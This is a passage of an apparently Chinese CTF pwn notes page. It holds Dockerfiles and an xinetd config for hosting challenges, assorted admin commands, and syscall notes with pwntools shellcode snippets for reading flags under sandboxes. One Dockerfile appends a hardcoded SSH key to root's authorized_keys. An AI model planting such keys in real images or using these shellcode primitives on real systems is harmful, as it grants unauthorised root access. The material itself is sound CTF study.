</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ADD</span> pwn.kafel /etc/pwn.kafel<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ./start.sh /start.sh<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chmod +x /start.sh<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 运维使用，添加了运维人员的公钥</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> mkdir /root/.ssh<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> <span class="s1">&#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtYBQRQ4uoo5kRyFQaGICnIF4aoxv8L+5FzgbBzemzibSPisnXTCPXpG4zISUpT6cGmtf3yVJErlzSYBU6NoOGXqj3zl0JsLMb0KC9MNnXLkNKsFabURJOdQWixXGsn9TS3r1vDfhTYKUCo2IRuCKlCoXMYWGJ3QTXqa4itgntI71Zi8/a8OSsdT10jaDk4M0xCdToPfQ18uzVmyNekqKyZor7wZr/OUpXzJTivnvTk3FHAzgetHXGpFr07FEAfFrI15WLzZvTPRM3gGn8m6jVkhMHegm6OK8s6UTuLvGSP+9B27UmJN4lvq8JTtTZIJ8qKgahg41+0/pumLMCYxox root@ubuntu&#39;</span> &gt;&gt; /root/.ssh/authorized_keys <span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chmod <span class="m">600</span> /root/.ssh/authorized_keys<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">CMD</span> <span class="p">[</span><span class="s2">&#34;/start.sh&#34;</span><span class="p">]</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230601005304003.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230601005304003.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230601005304003.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230601005304003.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230601005304003.png"
        title="image-20230601005304003" /></p>
<h3 id="dockerfile">Dockerfile</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FROM ubuntu:20.04
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">RUN sed -i &#34;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&#34; /etc/apt/sources.list &amp;&amp; \
</span></span><span class="line"><span class="cl">    sed -i &#34;s/deb http:\/\/se/#/g&#34; /etc/apt/sources.list &amp;&amp; \
</span></span><span class="line"><span class="cl">    sed -i &#34;s/deb-src http:\/\/se/#/g&#34; /etc/apt/sources.list &amp;&amp; \
</span></span><span class="line"><span class="cl">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \
</span></span><span class="line"><span class="cl">    apt-get install -y lib32z1 xinetd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">RUN useradd -m ctf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">WORKDIR /home/ctf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">RUN cp -R /usr/lib* /home/ctf
</span></span><span class="line"><span class="cl"># RUN cp -R /lib* /home/ctf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">RUN mkdir /home/ctf/dev &amp;&amp; \
</span></span><span class="line"><span class="cl">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \
</span></span><span class="line"><span class="cl">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \
</span></span><span class="line"><span class="cl">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \
</span></span><span class="line"><span class="cl">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \
</span></span><span class="line"><span class="cl">    chmod 666 /home/ctf/dev/*
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">RUN mkdir /home/ctf/bin &amp;&amp; \
</span></span><span class="line"><span class="cl">    cp /bin/sh /home/ctf/bin &amp;&amp; \
</span></span><span class="line"><span class="cl">    cp /bin/ls /home/ctf/bin &amp;&amp; \
</span></span><span class="line"><span class="cl">    cp /bin/cat /home/ctf/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">COPY ./ctf.xinetd /etc/xinetd.d/ctf
</span></span><span class="line"><span class="cl">COPY ./start.sh /start.sh
</span></span><span class="line"><span class="cl">RUN echo &#34;Blocked by ctf_xinetd&#34; &gt; /etc/banner_fail
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">RUN chmod +x /start.sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">COPY ./bin/ /home/ctf/
</span></span><span class="line"><span class="cl">RUN chown -R root:ctf /home/ctf &amp;&amp; \
</span></span><span class="line"><span class="cl">    chmod -R 750 /home/ctf &amp;&amp; \
</span></span><span class="line"><span class="cl">    chmod 740 /home/ctf/flag
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ENV NS_FLAG &#34;flag{test}&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">COPY script.sh /
</span></span><span class="line"><span class="cl">RUN chmod +x /script.sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">CMD /bin/bash -c &#39;/script.sh &amp;&amp; /start.sh&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">EXPOSE 8888
</span></span></code></pre></td></tr></table>
</div>
</div><p>快速替换源</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sed -i &#34;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&#34; /etc/apt/sources.list &amp;&amp; \
</span></span><span class="line"><span class="cl">    sed -i &#34;s/deb http:\/\/se/#/g&#34; /etc/apt/sources.list &amp;&amp; \
</span></span><span class="line"><span class="cl">    sed -i &#34;s/deb-src http:\/\/se/#/g&#34; /etc/apt/sources.list &amp;&amp; \
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ctfxinetd">ctf.xinetd</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">service ctf
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    disable = no
</span></span><span class="line"><span class="cl">    socket_type = stream
</span></span><span class="line"><span class="cl">    protocol    = tcp
</span></span><span class="line"><span class="cl">    wait        = no
</span></span><span class="line"><span class="cl">    user        = root
</span></span><span class="line"><span class="cl">    type        = UNLISTED
</span></span><span class="line"><span class="cl">    port        = 8888
</span></span><span class="line"><span class="cl">    bind        = 0.0.0.0
</span></span><span class="line"><span class="cl">    server      = /usr/sbin/chroot
</span></span><span class="line"><span class="cl">    # replace helloworld to your program
</span></span><span class="line"><span class="cl">    server_args = --userspec=1000:1000 /home/ctf ./pwn
</span></span><span class="line"><span class="cl">    banner_fail = /etc/banner_fail
</span></span><span class="line"><span class="cl">    # safety options
</span></span><span class="line"><span class="cl">    per_source	= 10 # the maximum instances of this service per source IP address
</span></span><span class="line"><span class="cl">    rlimit_cpu	= 20 # the maximum number of CPU seconds that the service may use
</span></span><span class="line"><span class="cl">    #rlimit_as  = 1024M # the Address Space resource limit for the service
</span></span><span class="line"><span class="cl">    #access_times = 2:00-9:00 12:00-24:00
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="stripsh">strip.sh</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$NS_FLAG</span><span class="s2">&#34;</span> &gt; /home/ctf/flag
</span></span><span class="line"><span class="cl"><span class="nb">exec</span> <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="startsh">start.sh</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1"># Add your startup script</span>
</span></span><span class="line"><span class="cl"><span class="c1"># DO NOT DELETE</span>
</span></span><span class="line"><span class="cl">/etc/init.d/xinetd start<span class="p">;</span>
</span></span><span class="line"><span class="cl">sleep infinity<span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="命令">命令</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker build -t imageName .
</span></span><span class="line"><span class="cl">sudo docker run -tid -e NS_FLAG=&#34;flag{abcdefg}&#34; -p &#34;0.0.0.0:pub_port:8888&#34; -h &#34;CONTAINER_NAME&#34; --name=&#34;CONTAINER_NAME&#34; imageName
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="afl工具使用">AFL工具使用</h2>
<p><a href="https://paper.seebug.org/841/" target="_blank" rel="noopener noreffer ">https://paper.seebug.org/841/</a></p>
<h3 id="afl-tmin">afl-tmin</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="linux调试版本不一致">linux调试版本不一致</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CONFIG_MODVERSIONS = n
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="添加swap交换分区空间"><strong>添加swap交换分区空间</strong></h2>
<p>1.查看当前内存和swap空间大小</p>
<p>$free -mh</p>
<p>2.创建swap交换分区文件/swap/swapfile，大小为8G</p>
<p>$ sudo mkdir /swap</p>
<p>$ sudo dd if=/dev/zero of=/swap/swapfile bs=1G count=8</p>
<p>3.格式化swap分区：</p>
<p>$sudo mkswap /swap/swapfile</p>
<p>4.设置交换分区：</p>
<p>$sudo mkswap -f /swap/swapfile</p>
<p>5.修改权限：</p>
<p>$sudo chmod 600 /swap/swapfile</p>
<p>6.激活swap分区：</p>
<p>$sudo swapon /swap/swapfile</p>
<p>6.设为开机自动启用：</p>
<p>$sudo vi /etc/fstab</p>
<p>在该文件底部添加如下内容：</p>
<p>/swap/swapfile swap swap default 0 0</p>
<h2 id="附删除swap交换分区"><strong>附：删除swap交换分区</strong></h2>
<p>1.停止正在使用的swap分区：</p>
<p>$sudo swapoff /swap/swapfile</p>
<p>2.删除swap分区文件：</p>
<p>$sudo rm /swap/swapfile</p>
<p>3.删除或注释在/etc/fstab文件中的以下开机自动挂载内容：</p>
<p>/swap/swapfile swap swap default 0 0</p>
<h2 id="解包">解包</h2>
<p>img镜像文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo mount
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="打包">打包</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo ~/ROM_toolbox-linux/make_ext4fs -s -l 268435456 new_system.img ./core
</span></span><span class="line"><span class="cl">sudo ~/ROM_toolbox-linux/simg2img new_system.img system_out.img
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="取消byteswaring">取消byteswaring</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">warnings</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">filterwarnings</span><span class="p">(</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="删除none镜像">删除none镜像</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker rmi -f $(sudo docker images | grep &#34;none&#34; | awk &#39;{print $3}&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="一些系统调用">一些系统调用</h2>
<h3 id="getdents">getdents</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">getdents</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">linux_dirent</span> <span class="o">*</span><span class="n">dirp</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">count</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s">&#34;./&#34;</span><span class="p">,</span><span class="mh">0x10000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">getdents</span><span class="p">(</span><span class="s">&#34;rax&#34;</span><span class="p">,</span><span class="s">&#34;rsp&#34;</span><span class="p">,</span><span class="mh">0x300</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&#34;rsp&#34;</span><span class="p">,</span><span class="mh">0x300</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="connect">connect</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">connect(ip,port)
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="mmap">mmap</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## 映射fd
</span></span><span class="line"><span class="cl">mmap(0x100000, 0x1000, 1, 3, &#39;rax&#39;, 0);
</span></span><span class="line"><span class="cl">## mmap一块区域
</span></span><span class="line"><span class="cl">mmap(0x100000, 0x1000, 0x7, 34, -1, 0);
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="openat">openat</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">openat(-100,&#34;./flag&#34;,0)
</span></span><span class="line"><span class="cl">openat(0, &#34;/flag&#34;, 0)
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ptrace">ptrace</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">long` `ptrace(enum __ptrace_request request, pid_t pid, void ``*``addr,void ``*``data);
</span></span><span class="line"><span class="cl">1``). enum __ptrace_request request：参数执行的行为
</span></span><span class="line"><span class="cl">2``). pid_t pid: ptrace要跟踪的进程号。
</span></span><span class="line"><span class="cl">3``). void ``*``addr: 存放数据的地址。
</span></span><span class="line"><span class="cl">4``). void ``*``data: 存放读取出的或者要写入的数据。
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">enum __ptrace_request
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    PTRACE_TRACEME = 0,        //被调试进程调用
</span></span><span class="line"><span class="cl">    PTRACE_PEEKTEXT = 1， //从内存addr处读取一个字节
</span></span><span class="line"><span class="cl">    PTRACE_PEEKDATA = 2,    //查看内存addr处的一个字节
</span></span><span class="line"><span class="cl">    PTRACE_PEEKUSER = 3,    //查看struct user 结构体的值
</span></span><span class="line"><span class="cl">    PTRACE_POKETEXT = 4， //查看内存addr处一个字大小的内存（4字节）
</span></span><span class="line"><span class="cl">    PTRACE_POKEDATA = 5,    //修改内存addr处一个字大小的内存（4字节）
</span></span><span class="line"><span class="cl">    PTRACE_POKEUSER = 6,    //修改struct user结构体的值
</span></span><span class="line"><span class="cl">    PTRACE_CONT = 7,        //被调试进程pid继续
</span></span><span class="line"><span class="cl">    PTRACE_SINGLESTEP = 9,    //被调试进程pid执行一条汇编指令
</span></span><span class="line"><span class="cl">    PTRACE_GETREGS = 12,    //获取寄存器(struct user_regs_struct)到内存data中
</span></span><span class="line"><span class="cl">    PTRACE_SETREGS = 13,    //设置内存data上的数据为寄存器(struct user_regs_struct)
</span></span><span class="line"><span class="cl">    PTRACE_ATTACH = 16,        //附加进程pid
</span></span><span class="line"><span class="cl">    PTRACE_DETACH = 17,        //解除附加进程pid
</span></span><span class="line"><span class="cl">    PTRACE_SYSCALL = 24,    //让被调试进程pid在系统调用入口或出口停止
</span></span><span class="line"><span class="cl">};
</span></span><span class="line"><span class="cl">long int ptrace (enum __ptrace_request __request, ...)
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1">##/arch/x86/include/uapi/asm/ptrace-abi.h
</span></span></span><span class="line"><span class="cl"><span class="c1">#define R15 0
</span></span></span><span class="line"><span class="cl"><span class="c1">#define R14 8
</span></span></span><span class="line"><span class="cl"><span class="c1">#define R13 16
</span></span></span><span class="line"><span class="cl"><span class="c1">#define R12 24
</span></span></span><span class="line"><span class="cl"><span class="c1">#define RBP 32
</span></span></span><span class="line"><span class="cl"><span class="c1">#define RBX 40
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">/``*`</span><span class="w"> </span><span class="o">`</span><span class="n">These</span><span class="w"> </span><span class="n">regs</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">callee</span><span class="o">``-``</span><span class="n">clobbered</span><span class="p">.</span><span class="w"> </span><span class="n">Always</span><span class="w"> </span><span class="n">saved</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">kernel</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="w"> </span><span class="o">``*``/</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">#define R11 48
</span></span></span><span class="line"><span class="cl"><span class="c1">#define R10 56
</span></span></span><span class="line"><span class="cl"><span class="c1">#define R9 64
</span></span></span><span class="line"><span class="cl"><span class="c1">#define R8 72
</span></span></span><span class="line"><span class="cl"><span class="c1">#define RAX 80
</span></span></span><span class="line"><span class="cl"><span class="c1">#define RCX 88
</span></span></span><span class="line"><span class="cl"><span class="c1">#define RDX 96
</span></span></span><span class="line"><span class="cl"><span class="c1">#define RSI 104
</span></span></span><span class="line"><span class="cl"><span class="c1">#define RDI 112
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">/``*</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="o">``*`</span><span class="w"> </span><span class="o">`</span><span class="k">On</span><span class="w"> </span><span class="n">syscall</span><span class="w"> </span><span class="n">entry</span><span class="p">,</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="o">``</span><span class="k">is</span><span class="o">`</span><span class="w"> </span><span class="o">`</span><span class="n">syscall</span><span class="o">``</span><span class="c1">#. On CPU exception, this is error code.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="o">``*`</span><span class="w"> </span><span class="o">`</span><span class="k">On</span><span class="w"> </span><span class="n">hw</span><span class="w"> </span><span class="n">interrupt</span><span class="p">,</span><span class="w"> </span><span class="n">it</span><span class="s1">&#39;s IRQ number:
</span></span></span><span class="line"><span class="cl"><span class="s1"> ``*``/
</span></span></span><span class="line"><span class="cl"><span class="s1">#define ORIG_RAX 120
</span></span></span><span class="line"><span class="cl"><span class="s1">/``*` `Return frame ``for` `iretq ``*``/
</span></span></span><span class="line"><span class="cl"><span class="s1">#define RIP 128
</span></span></span><span class="line"><span class="cl"><span class="s1">#define CS 136
</span></span></span><span class="line"><span class="cl"><span class="s1">#define EFLAGS 144
</span></span></span><span class="line"><span class="cl"><span class="s1">#define RSP 152
</span></span></span><span class="line"><span class="cl"><span class="s1">#define SS 160
</span></span></span><span class="line"><span class="cl"><span class="s1">#endif /* __ASSEMBLY__ */
</span></span></span><span class="line"><span class="cl"><span class="s1">/``*` `top of stack page ``*``/
</span></span></span><span class="line"><span class="cl"><span class="s1">#define FRAME_SIZE 168
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="arch_prctl">arch_prctl</h3>
<p>会将heap[0]设置为0xdeadbeef</p>
<p>ARCH_SET_GS == 0x1001</p>
<p>ARCH_GET_GS == 0x1004</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">arch_prctl(ARCH_SET_GS, 0xdeadbeef);
</span></span><span class="line"><span class="cl">arch_prctl(ARCH_GET_GS, $heap);
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="writev">writev</h3>
<p>addr[0] = want_leak_addr</p>
<p>addr[1] = size</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">syscall(20, 1, addr, 1)
</span></span><span class="line"><span class="cl">writev(1,addr,1)
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="prlimit">prlimit</h3>
<p><a href="https://hackmd.io/@ptr-yudai/SJEgM1vzq" target="_blank" rel="noopener noreffer ">https://hackmd.io/@ptr-yudai/SJEgM1vzq</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">perlimt(ppid,9,new_limit,NULL)
</span></span><span class="line"><span class="cl">prlimit(ppid,9,remove_limit, NULL)
</span></span><span class="line"><span class="cl">new_limit:
</span></span><span class="line"><span class="cl">  dq 0                          ; soft limit
</span></span><span class="line"><span class="cl">  dq 0x133700000000             ; hard limit
</span></span><span class="line"><span class="cl">remove_limit:
</span></span><span class="line"><span class="cl">  dq 0x133700000000             ; soft limit
</span></span><span class="line"><span class="cl">  dq 0x133700000000             ; hard limit
